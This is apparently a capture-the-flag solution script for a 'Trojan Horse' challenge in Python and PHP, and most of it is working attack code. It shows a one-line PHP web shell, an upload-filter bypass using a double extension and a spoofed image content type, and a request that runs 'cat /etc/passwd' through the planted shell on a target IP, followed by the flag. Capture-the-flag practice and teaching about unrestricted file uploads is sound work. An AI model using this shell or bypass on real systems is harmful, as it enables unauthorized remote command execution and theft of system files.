"""
Challenge Name: Trojan Horse
Level: Medium

we should upload php backdoor by bypassing the image filter.

filename : payload.jpg.php
content-type: image/jpeg

Art uploaded : uploads/063af38f208d0c7e59a434377a1f7a71.php

<?php system($_GET['1']); ?>

"""

import requests

url="http://18.194.166.81/trojan/uploads/063af38f208d0c7e59a434377a1f7a71.php?1="

req = requests.get(url + "cat /etc/passwd")

print(req.text)

# SBCTF{unr3s7r1c73d_f1l3_upl04d_1s_d4ng3r0us}